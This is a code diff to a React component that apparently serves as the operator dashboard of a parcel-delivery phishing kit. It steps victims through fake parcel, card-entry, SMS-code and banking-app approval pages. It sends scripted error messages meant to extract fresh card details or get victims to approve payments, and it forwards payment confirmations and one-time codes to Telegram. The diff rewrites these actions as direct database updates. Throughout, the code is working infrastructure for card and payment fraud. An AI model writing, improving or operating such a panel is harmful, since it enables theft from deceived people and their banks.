@@ -131,117 +131,114 @@ export function ClientCard({ session, isSelected = false, onToggleSelect }: Clie
     return ip.slice(0, 10) + '...';
   };
 
-  // Helper function to update a session via the admin backend function (bypasses RLS)
-  const updateSession = async (updates: Record<string, unknown>, successTitle?: string) => {
-    try {
-      const token = sessionStorage.getItem("admin_token");
-      const { data, error } = await supabase.functions.invoke("admin-sessions", {
-        headers: token ? { Authorization: `Bearer ${token}` } : {},
-        body: { action: "update", sessionId: session.id, updates },
-      });
+  const updateClientStep = async (newStep: number) => {
+    const updateData: { current_step: number; approval_type?: null } = { current_step: newStep };
+    if (newStep === 2) {
+      updateData.approval_type = null;
+    }
+    
+    const { error } = await supabase
+      .from("client_sessions")
+      .update(updateData)
+      .eq("id", session.id);
 
-      if (error || !data?.success) {
-        console.error("Admin update failed:", error || data?.error);
-        toast({
-          title: "Error",
-          description: data?.error || error?.message || "Failed to update client",
-          variant: "destructive",
-        });
-        return false;
-      }
-
-      if (successTitle) {
-        toast({ title: successTitle });
-      }
-      return true;
-    } catch (err) {
-      console.error("Admin update error:", err);
-      toast({ title: "Error", description: "Failed to update client", variant: "destructive" });
-      return false;
+    if (error) {
+      toast({ title: "Error", description: "Failed to update step", variant: "destructive" });
+    } else {
+      toast({ title: "Success", description: `Sent to ${stepNames[newStep]}` });
     }
   };
 
-  const updateClientStep = async (newStep: number) => {
-    const updateData: { current_step: number; approval_type?: null } = { current_step: newStep };
-    if (newStep === 2) updateData.approval_type = null;
-    await updateSession(updateData, `Sent to ${stepNames[newStep]}`);
-  };
-
   const confirmPayment = async () => {
-    const ok = await updateSession({ current_step: 4, approval_type: "sms" }, "Payment Confirmed");
-    if (ok) {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ current_step: 4, approval_type: "sms" })
+      .eq("id", session.id);
+
+    if (!error) {
       await supabase.functions.invoke("send-telegram", {
         body: { message: `✅ Payment Confirmed (SMS) - #${session.session_code}` },
       });
+      toast({ title: "Payment Confirmed" });
     }
   };
 
   const approvePayment = async () => {
-    const ok = await updateSession({ current_step: 4, approval_type: "app" }, "Payment Approved (App)");
-    if (ok) {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ current_step: 4, approval_type: "app" })
+      .eq("id", session.id);
+
+    if (!error) {
       await supabase.functions.invoke("send-telegram", {
         body: { message: `✅ Payment Approved (App) - #${session.session_code}` },
       });
+      toast({ title: "Payment Approved (App)" });
     }
   };
 
   const sendWrongSmsMessage = async () => {
-    await updateSession(
-      {
+    await supabase
+      .from("client_sessions")
+      .update({ 
         admin_message: "The verification code you entered is incorrect. Please check and try again.",
-        message_type: "error",
-      },
-      "Wrong SMS alert sent"
-    );
+        message_type: "error"
+      })
+      .eq("id", session.id);
+    toast({ title: "Wrong SMS alert sent" });
   };
 
   const sendWrongCardMessage = async () => {
-    await updateSession(
-      {
+    await supabase
+      .from("client_sessions")
+      .update({ 
         current_step: 2,
         approval_type: null,
         admin_message: "The card details you entered are incorrect. Please check and try again.",
-        message_type: "error",
-      },
-      "Sent back to card page"
-    );
+        message_type: "error"
+      })
+      .eq("id", session.id);
+    toast({ title: "Sent back to card page" });
   };
 
   const sendBackToParcel = async () => {
-    await updateSession(
-      {
+    await supabase
+      .from("client_sessions")
+      .update({ 
         current_step: 1,
         approval_type: null,
         admin_message: null,
-        message_type: null,
-      },
-      "Sent back to parcel page"
-    );
+        message_type: null
+      })
+      .eq("id", session.id);
+    toast({ title: "Sent back to parcel page" });
   };
 
   const sendToSmsVerification = async () => {
-    await updateSession(
-      { current_step: 3, approval_type: null, verification_code: null },
-      "Sent to SMS verification"
-    );
+    await supabase
+      .from("client_sessions")
+      .update({ current_step: 3, approval_type: null, verification_code: null })
+      .eq("id", session.id);
+    toast({ title: "Sent to SMS verification" });
   };
 
   const sendToAppApproval = async () => {
-    await updateSession(
-      { current_step: 3, approval_type: "app_pending", verification_code: null },
-      "Sent to App approval"
-    );
+    await supabase
+      .from("client_sessions")
+      .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
+      .eq("id", session.id);
+    toast({ title: "Sent to App approval" });
   };
 
   const sendNotApprovedMessage = async () => {
-    await updateSession(
-      {
-        admin_message:
-          "The payment has not been approved yet. Please open your banking app and approve the payment notification.",
-        message_type: "error",
-      },
-      "Not approved alert sent"
-    );
+    await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: "The payment has not been approved yet. Please open your banking app and approve the payment notification.",
+        message_type: "error"
+      })
+      .eq("id", session.id);
+    toast({ title: "Not approved alert sent" });
   };
 
   const sendMessage = async () => {
@@ -249,39 +246,55 @@ export function ClientCard({ session, isSelected = false, onToggleSelect }: Clie
       toast({ title: "Error", description: "Enter a message", variant: "destructive" });
       return;
     }
-    const ok = await updateSession(
-      { admin_message: messageInput.message, message_type: messageInput.type },
-      "Message sent"
-    );
-    if (ok) setMessageInput({ message: "", type: "error" });
+
+    await supabase
+      .from("client_sessions")
+      .update({ admin_message: messageInput.message, message_type: messageInput.type })
+      .eq("id", session.id);
+    
+    toast({ title: "Message sent" });
+    setMessageInput({ message: "", type: "error" });
   };
 
   const clearMessage = async () => {
-    await updateSession({ admin_message: null, message_type: null }, "Message cleared");
+    await supabase
+      .from("client_sessions")
+      .update({ admin_message: null, message_type: null })
+      .eq("id", session.id);
+    toast({ title: "Message cleared" });
   };
 
   const resendVerificationCode = async () => {
     const newCode = Math.floor(100000 + Math.random() * 900000).toString();
-    const ok = await updateSession({ verification_code: newCode }, `New code: ${newCode}`);
-    if (ok) {
-      await supabase.functions.invoke("send-telegram", {
-        body: { message: `🔑 New Code: ${newCode} - #${session.session_code}` },
-      });
-    }
+    await supabase
+      .from("client_sessions")
+      .update({ verification_code: newCode })
+      .eq("id", session.id);
+    
+    await supabase.functions.invoke("send-telegram", {
+      body: { message: `🔑 New Code: ${newCode} - #${session.session_code}` },
+    });
+    toast({ title: `New code: ${newCode}` });
   };
 
   const saveParcelDetails = async () => {
-    const ok = await updateSession(
-      {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({
         parcel_tracking: parcelForm.parcel_tracking || null,
         amount: parcelForm.amount ? parseFloat(parcelForm.amount) : null,
         origin: parcelForm.origin || null,
         destination: parcelForm.destination || null,
-        estimated_delivery: parcelForm.estimated_delivery || null,
-      },
-      "Parcel details updated"
-    );
-    if (ok) setIsEditingParcel(false);
+        estimated_delivery: parcelForm.estimated_delivery || null
+      })
+      .eq("id", session.id);
+
+    if (error) {
+      toast({ title: "Error", description: "Failed to update parcel details", variant: "destructive" });
+    } else {
+      toast({ title: "Parcel details updated" });
+      setIsEditingParcel(false);
+    }
   };
 
   return (
